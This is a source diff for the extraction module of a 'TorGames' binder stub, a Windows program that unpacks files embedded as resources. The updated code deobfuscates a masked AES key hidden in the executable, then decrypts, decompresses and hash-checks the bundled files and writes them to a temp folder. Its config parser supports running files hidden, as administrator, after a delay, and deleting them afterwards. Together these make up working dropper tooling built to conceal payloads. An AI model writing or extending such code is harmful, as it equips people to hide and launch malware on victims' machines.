@@ -1,207 +1,432 @@
-// TorGames.Binder.Stub - Resource extraction implementation
+// ============================================================================
+// File: src/Extractor.cpp (Stub - UPDATED)
+// Purpose: Implementation with decryption and decompression
+// ============================================================================
+
 #include "Extractor.h"
-#include <algorithm>
+#include "../crypto/crypto.h"
+#include "../compression/compression.h"
+#include "../hash/hash.h"
+
+#include <windows.h>
+#include <shlwapi.h>
+#include <fstream>
+#include <sstream>
 
 namespace Extractor {
 
-// Simple JSON string extraction - handles spaces after colon
-static std::string JsonGetString(const char* json, const char* key) {
-    char pattern[128];
-    snprintf(pattern, sizeof(pattern), "\"%s\":", key);
-    const char* start = strstr(json, pattern);
-    if (!start) return "";
-    start += strlen(pattern);
+static std::string g_lastError;
+static std::vector<uint8_t> g_encryptionKey;
+static bool g_initialized = false;
 
-    // Skip whitespace
-    while (*start == ' ' || *start == '\t' || *start == '\n' || *start == '\r') start++;
+// Forward declaration
+static bool ParseConfig(const std::string& json, BinderConfig& config);
 
-    // Expect opening quote
-    if (*start != '"') return "";
-    start++;
-
-    std::string result;
-    while (*start && *start != '"') {
-        if (*start == '\\' && *(start + 1)) {
-            start++;
-            switch (*start) {
-                case 'n': result += '\n'; break;
-                case 'r': result += '\r'; break;
-                case 't': result += '\t'; break;
-                case '\\': result += '\\'; break;
-                case '"': result += '"'; break;
-                default: result += *start; break;
-            }
-        } else {
-            result += *start;
-        }
-        start++;
+bool Initialize() {
+    if (g_initialized) {
+        return true;
     }
-    return result;
-}
 
-static long long JsonGetInt(const char* json, const char* key) {
-    char pattern[128];
-    snprintf(pattern, sizeof(pattern), "\"%s\":", key);
-    const char* start = strstr(json, pattern);
-    if (!start) return 0;
-    start += strlen(pattern);
-    while (*start == ' ') start++;
-    return atoll(start);
-}
+    // Initialize crypto and hash modules
+    if (!Crypto::Initialize()) {
+        g_lastError = "Failed to initialize crypto module";
+        return false;
+    }
 
-static bool JsonGetBool(const char* json, const char* key) {
-    char pattern[128];
-    snprintf(pattern, sizeof(pattern), "\"%s\":", key);
-    const char* start = strstr(json, pattern);
-    if (!start) return false;
-    start += strlen(pattern);
-    while (*start == ' ') start++;
-    return (strncmp(start, "true", 4) == 0);
-}
+    if (!Hash::Initialize()) {
+        g_lastError = "Failed to initialize hash module";
+        return false;
+    }
 
-// Parse a single file config from JSON object
-static bool ParseFileConfig(const char* jsonObj, BoundFileConfig& config) {
-    config.filename = JsonGetString(jsonObj, "filename");
-    config.executionOrder = static_cast<int>(JsonGetInt(jsonObj, "executionOrder"));
-    config.executeFile = JsonGetBool(jsonObj, "executeFile");
-    config.waitForExit = JsonGetBool(jsonObj, "waitForExit");
-    config.runHidden = JsonGetBool(jsonObj, "runHidden");
-    config.runAsAdmin = JsonGetBool(jsonObj, "runAsAdmin");
-    config.extractPath = JsonGetString(jsonObj, "extractPath");
-    config.commandLineArgs = JsonGetString(jsonObj, "commandLineArgs");
-    config.executionDelay = static_cast<int>(JsonGetInt(jsonObj, "executionDelay"));
-    config.deleteAfterExecution = JsonGetBool(jsonObj, "deleteAfterExecution");
-    return !config.filename.empty();
-}
+    // Try to load encryption key
+    HMODULE hModule = GetModuleHandleA(nullptr);
+    HRSRC hKeyRes = FindResourceA(hModule, MAKEINTRESOURCEA(1), MAKEINTRESOURCEA(RT_BINDER_KEY));
 
-// Parse the files array from JSON
-static void ParseFilesArray(const char* json, std::vector<BoundFileConfig>& files) {
-    // Look for "files" key - handle both "files":[ and "files": [ (with space)
-    const char* filesStart = strstr(json, "\"files\"");
-    if (!filesStart) return;
+    if (hKeyRes) {
+        HGLOBAL hKeyData = LoadResource(hModule, hKeyRes);
+        DWORD keyDataSize = SizeofResource(hModule, hKeyRes);
 
-    // Find the opening bracket
-    filesStart = strchr(filesStart, '[');
-    if (!filesStart) return;
-    filesStart++;
+        if (hKeyData && keyDataSize == AES_KEY_SIZE * 2) {
+            const uint8_t* keyPtr = static_cast<const uint8_t*>(LockResource(hKeyData));
 
-    int braceCount = 0;
-    const char* objStart = nullptr;
+            // Extract obfuscated key and mask
+            std::vector<uint8_t> obfuscatedKey(keyPtr, keyPtr + AES_KEY_SIZE);
+            std::vector<uint8_t> mask(keyPtr + AES_KEY_SIZE, keyPtr + AES_KEY_SIZE * 2);
 
-    for (const char* p = filesStart; *p && *p != ']'; p++) {
-        if (*p == '{') {
-            if (braceCount == 0) objStart = p;
-            braceCount++;
-        } else if (*p == '}') {
-            braceCount--;
-            if (braceCount == 0 && objStart) {
-                // Extract the object
-                size_t len = p - objStart + 1;
-                std::string objStr(objStart, len);
-
-                BoundFileConfig config;
-                if (ParseFileConfig(objStr.c_str(), config)) {
-                    files.push_back(config);
-                }
-                objStart = nullptr;
-            }
+            // Deobfuscate key
+            g_encryptionKey = Crypto::DeobfuscateKey(obfuscatedKey, mask);
         }
     }
 
-    // Sort by execution order
-    std::sort(files.begin(), files.end(),
-        [](const BoundFileConfig& a, const BoundFileConfig& b) {
-            return a.executionOrder < b.executionOrder;
-        });
+    g_initialized = true;
+    return true;
+}
+
+void Cleanup() {
+    Crypto::Cleanup();
+    Hash::Cleanup();
+
+    // Securely clear key from memory
+    if (!g_encryptionKey.empty()) {
+        SecureZeroMemory(g_encryptionKey.data(), g_encryptionKey.size());
+        g_encryptionKey.clear();
+    }
+
+    g_initialized = false;
 }
 
 bool LoadConfig(BinderConfig& config) {
-    // Find the CONFIG resource
-    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(1), MAKEINTRESOURCEA(RT_BINDER_CONFIG));
-    if (!hRes) return false;
+    if (!g_initialized && !Initialize()) {
+        return false;
+    }
 
-    HGLOBAL hData = LoadResource(NULL, hRes);
-    if (!hData) return false;
+    HMODULE hModule = GetModuleHandleA(nullptr);
+    HRSRC hRes = FindResourceA(hModule, MAKEINTRESOURCEA(1), MAKEINTRESOURCEA(RT_BINDER_CONFIG));
 
-    void* pData = LockResource(hData);
-    if (!pData) return false;
+    if (!hRes) {
+        g_lastError = "Configuration resource not found";
+        return false;
+    }
 
-    DWORD size = SizeofResource(NULL, hRes);
-    if (size == 0) return false;
+    HGLOBAL hData = LoadResource(hModule, hRes);
+    DWORD dataSize = SizeofResource(hModule, hRes);
 
-    // Copy to null-terminated string
-    std::string jsonStr(static_cast<const char*>(pData), size);
-    const char* json = jsonStr.c_str();
+    if (!hData || dataSize == 0) {
+        g_lastError = "Failed to load configuration resource";
+        return false;
+    }
 
-    // Parse config
-    config.configVersion = static_cast<int>(JsonGetInt(json, "configVersion"));
-    config.requireAdmin = JsonGetBool(json, "requireAdmin");
+    const uint8_t* dataPtr = static_cast<const uint8_t*>(LockResource(hData));
+    std::vector<uint8_t> configData(dataPtr, dataPtr + dataSize);
 
-    // Parse files array
-    ParseFilesArray(json, config.files);
+    // Decrypt if key is available
+    std::string configJson;
+    if (!g_encryptionKey.empty()) {
+        auto decryptResult = Crypto::Decrypt(configData, g_encryptionKey);
+        if (decryptResult.error != Crypto::CryptoError::Success) {
+            g_lastError = "Failed to decrypt configuration: " + decryptResult.errorMessage;
+            return false;
+        }
+        configJson.assign(decryptResult.data.begin(), decryptResult.data.end());
+    } else {
+        configJson.assign(configData.begin(), configData.end());
+    }
 
-    return !config.files.empty();
+    // Parse JSON configuration
+    return ParseConfig(configJson, config);
 }
 
-bool ExtractFile(int resourceId, const char* outputPath) {
-    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(RT_BINDER_FILE));
-    if (!hRes) return false;
+ExtractResult ExtractFile(
+    int resourceId,
+    const BoundFileConfig& config,
+    const std::string& extractFolder
+) {
+    ExtractResult result;
+    result.error = ExtractorError::Success;
 
-    HGLOBAL hData = LoadResource(NULL, hRes);
-    if (!hData) return false;
+    if (!g_initialized && !Initialize()) {
+        result.error = ExtractorError::FileExtractFailed;
+        result.errorMessage = "Extractor not initialized";
+        return result;
+    }
 
-    void* pData = LockResource(hData);
-    if (!pData) return false;
+    HMODULE hModule = GetModuleHandleA(nullptr);
+    HRSRC hRes = FindResourceA(
+        hModule,
+        MAKEINTRESOURCEA(resourceId),
+        MAKEINTRESOURCEA(RT_BINDER_FILE)
+    );
 
-    DWORD size = SizeofResource(NULL, hRes);
-    if (size == 0) return false;
+    if (!hRes) {
+        result.error = ExtractorError::FileExtractFailed;
+        result.errorMessage = "File resource not found: " + std::to_string(resourceId);
+        return result;
+    }
 
-    FILE* f = fopen(outputPath, "wb");
-    if (!f) return false;
+    HGLOBAL hData = LoadResource(hModule, hRes);
+    DWORD dataSize = SizeofResource(hModule, hRes);
 
-    size_t written = fwrite(pData, 1, size, f);
-    fclose(f);
+    if (!hData || dataSize == 0) {
+        result.error = ExtractorError::FileExtractFailed;
+        result.errorMessage = "Failed to load file resource";
+        return result;
+    }
 
-    return (written == size);
+    const uint8_t* dataPtr = static_cast<const uint8_t*>(LockResource(hData));
+    std::vector<uint8_t> fileData(dataPtr, dataPtr + dataSize);
+
+    // Step 1: Decrypt if encrypted
+    if (!g_encryptionKey.empty()) {
+        auto decryptResult = Crypto::Decrypt(fileData, g_encryptionKey);
+        if (decryptResult.error != Crypto::CryptoError::Success) {
+            result.error = ExtractorError::FileDecryptFailed;
+            result.errorMessage = "Decryption failed: " + decryptResult.errorMessage;
+            return result;
+        }
+        fileData = std::move(decryptResult.data);
+    }
+
+    // Step 2: Decompress if compressed
+    if (config.compressedSize != config.fileSize && config.compressedSize > 0) {
+        auto decompressResult = Compression::Decompress(fileData);
+        if (decompressResult.error != Compression::CompressionError::Success) {
+            result.error = ExtractorError::FileDecompressFailed;
+            result.errorMessage = "Decompression failed: " + decompressResult.errorMessage;
+            return result;
+        }
+        fileData = std::move(decompressResult.data);
+    }
+
+    // Step 3: Verify hash if available
+    if (!config.sha256Hash.empty()) {
+        auto hashResult = Hash::SHA256(fileData);
+        if (hashResult.error != Hash::HashError::Success) {
+            result.error = ExtractorError::HashVerificationFailed;
+            result.errorMessage = "Hash calculation failed";
+            return result;
+        }
+
+        std::string calculatedHash = Hash::HashToHex(hashResult.hash);
+        if (calculatedHash != config.sha256Hash) {
+            result.error = ExtractorError::HashVerificationFailed;
+            result.errorMessage = "Hash mismatch - file may be corrupted or tampered";
+            return result;
+        }
+    }
+
+    // Step 4: Write to disk
+    std::string outputPath;
+    if (!config.extractPath.empty()) {
+        outputPath = config.extractPath;
+    } else {
+        outputPath = extractFolder + "\\" + config.filename;
+    }
+
+    std::ofstream outFile(outputPath, std::ios::binary);
+    if (!outFile.is_open()) {
+        result.error = ExtractorError::FileWriteFailed;
+        result.errorMessage = "Failed to create output file: " + outputPath;
+        return result;
+    }
+
+    outFile.write(reinterpret_cast<const char*>(fileData.data()), fileData.size());
+    outFile.close();
+
+    if (!outFile.good()) {
+        result.error = ExtractorError::FileWriteFailed;
+        result.errorMessage = "Failed to write file data";
+        return result;
+    }
+
+    result.extractedPath = outputPath;
+    return result;
+}
+
+bool ExtractAll(
+    const BinderConfig& config,
+    const std::string& extractFolder,
+    std::vector<std::string>& extractedPaths
+) {
+    extractedPaths.clear();
+    extractedPaths.reserve(config.files.size());
+
+    for (size_t i = 0; i < config.files.size(); ++i) {
+        const auto& file = config.files[i];
+
+        auto result = ExtractFile(
+            static_cast<int>(i + 1),
+            file,
+            extractFolder
+        );
+
+        if (result.error != ExtractorError::Success) {
+            g_lastError = result.errorMessage;
+            return false;
+        }
+
+        extractedPaths.push_back(result.extractedPath);
+    }
+
+    return true;
 }
 
 std::string GetTempExtractionFolder() {
     char tempPath[MAX_PATH];
     GetTempPathA(MAX_PATH, tempPath);
 
-    // Create unique folder name using process ID
-    char folderName[MAX_PATH];
-    snprintf(folderName, sizeof(folderName), "%sTorGames_Binder_%lu",
-             tempPath, GetCurrentProcessId());
+    std::ostringstream folderName;
+    folderName << tempPath << "TorGames_Binder_" << GetCurrentProcessId();
 
-    return folderName;
+    return folderName.str();
 }
 
-bool CreateExtractionFolder(const std::string& path) {
-    return CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
+bool CreateExtractionFolder(const std::string& folderPath) {
+    return CreateDirectoryA(folderPath.c_str(), nullptr) ||
+           ::GetLastError() == ERROR_ALREADY_EXISTS;
 }
 
-void CleanupExtractionFolder(const std::string& path) {
-    // Delete all files in the folder
-    char searchPath[MAX_PATH];
-    snprintf(searchPath, sizeof(searchPath), "%s\\*", path.c_str());
+bool CleanupExtractionFolder(
+    const std::string& folderPath,
+    const std::vector<std::string>& excludeFiles
+) {
+    // Retry parameters
+    const int MAX_RETRIES = 3;
+    const int RETRY_DELAY_MS = 100;
 
     WIN32_FIND_DATAA findData;
-    HANDLE hFind = FindFirstFileA(searchPath, &findData);
+    std::string searchPath = folderPath + "\\*";
 
-    if (hFind != INVALID_HANDLE_VALUE) {
-        do {
-            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                char filePath[MAX_PATH];
-                snprintf(filePath, sizeof(filePath), "%s\\%s", path.c_str(), findData.cFileName);
-                DeleteFileA(filePath);
-            }
-        } while (FindNextFileA(hFind, &findData));
-        FindClose(hFind);
+    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        return true; // Folder doesn't exist or empty
     }
 
-    // Remove the folder itself
-    RemoveDirectoryA(path.c_str());
+    do {
+        if (strcmp(findData.cFileName, ".") == 0 ||
+            strcmp(findData.cFileName, "..") == 0) {
+            continue;
+        }
+
+        std::string filePath = folderPath + "\\" + findData.cFileName;
+
+        // Check if file should be excluded
+        bool exclude = false;
+        for (const auto& excludePath : excludeFiles) {
+            if (_stricmp(filePath.c_str(), excludePath.c_str()) == 0) {
+                exclude = true;
+                break;
+            }
+        }
+
+        if (!exclude) {
+            // Try to delete with retries
+            for (int retry = 0; retry < MAX_RETRIES; ++retry) {
+                if (DeleteFileA(filePath.c_str())) {
+                    break;
+                }
+                Sleep(RETRY_DELAY_MS);
+            }
+        }
+    } while (FindNextFileA(hFind, &findData));
+
+    FindClose(hFind);
+
+    // Try to remove the folder
+    for (int retry = 0; retry < MAX_RETRIES; ++retry) {
+        if (RemoveDirectoryA(folderPath.c_str())) {
+            return true;
+        }
+        Sleep(RETRY_DELAY_MS);
+    }
+
+    return false;
+}
+
+std::string GetLastError() {
+    return g_lastError;
+}
+
+// Simple JSON value extraction helpers
+static std::string ExtractString(const std::string& json, const std::string& key) {
+    std::string searchKey = "\"" + key + "\":\"";
+    size_t pos = json.find(searchKey);
+    if (pos == std::string::npos) return "";
+
+    pos += searchKey.length();
+    size_t endPos = json.find("\"", pos);
+    if (endPos == std::string::npos) return "";
+
+    // Handle escape sequences
+    std::string result;
+    for (size_t i = pos; i < endPos; ++i) {
+        if (json[i] == '\\' && i + 1 < endPos) {
+            switch (json[i + 1]) {
+                case 'n': result += '\n'; break;
+                case 'r': result += '\r'; break;
+                case 't': result += '\t'; break;
+                case '\\': result += '\\'; break;
+                case '"': result += '"'; break;
+                default: result += json[i + 1]; break;
+            }
+            ++i;
+        } else {
+            result += json[i];
+        }
+    }
+    return result;
+}
+
+static int ExtractInt(const std::string& json, const std::string& key) {
+    std::string searchKey = "\"" + key + "\":";
+    size_t pos = json.find(searchKey);
+    if (pos == std::string::npos) return 0;
+
+    pos += searchKey.length();
+    while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) ++pos;
+
+    return atoi(json.c_str() + pos);
+}
+
+static bool ExtractBool(const std::string& json, const std::string& key) {
+    std::string searchKey = "\"" + key + "\":";
+    size_t pos = json.find(searchKey);
+    if (pos == std::string::npos) return false;
+
+    pos += searchKey.length();
+    while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) ++pos;
+
+    return (json.substr(pos, 4) == "true");
+}
+
+static bool ParseConfig(const std::string& json, BinderConfig& config) {
+    // Parse global config
+    config.configVersion = ExtractInt(json, "configVersion");
+    config.requireAdmin = ExtractBool(json, "requireAdmin");
+    config.compressionType = ExtractInt(json, "compressionType");
+    config.encryptionType = ExtractInt(json, "encryptionType");
+
+    // Parse files array
+    config.files.clear();
+
+    size_t filesPos = json.find("\"files\":[");
+    if (filesPos == std::string::npos) {
+        return false;
+    }
+
+    filesPos += 9; // Skip "files":[
+    size_t filesEnd = json.rfind("]");
+    if (filesEnd == std::string::npos || filesEnd <= filesPos) {
+        return false;
+    }
+
+    // Find each file object
+    size_t objStart = filesPos;
+    while ((objStart = json.find("{", objStart)) != std::string::npos && objStart < filesEnd) {
+        size_t objEnd = json.find("}", objStart);
+        if (objEnd == std::string::npos || objEnd > filesEnd) break;
+
+        std::string fileJson = json.substr(objStart, objEnd - objStart + 1);
+
+        BoundFileConfig file;
+        file.filename = ExtractString(fileJson, "filename");
+        file.executionOrder = ExtractInt(fileJson, "executionOrder");
+        file.executeFile = ExtractBool(fileJson, "executeFile");
+        file.waitForExit = ExtractBool(fileJson, "waitForExit");
+        file.runHidden = ExtractBool(fileJson, "runHidden");
+        file.runAsAdmin = ExtractBool(fileJson, "runAsAdmin");
+        file.extractPath = ExtractString(fileJson, "extractPath");
+        file.commandLineArgs = ExtractString(fileJson, "commandLineArgs");
+        file.executionDelay = ExtractInt(fileJson, "executionDelay");
+        file.deleteAfterExecution = ExtractBool(fileJson, "deleteAfterExecution");
+        file.fileSize = static_cast<DWORD>(ExtractInt(fileJson, "fileSize"));
+        file.compressedSize = static_cast<DWORD>(ExtractInt(fileJson, "compressedSize"));
+        file.sha256Hash = ExtractString(fileJson, "sha256Hash");
+
+        config.files.push_back(file);
+        objStart = objEnd + 1;
+    }
+
+    return !config.files.empty();
 }
 
 } // namespace Extractor
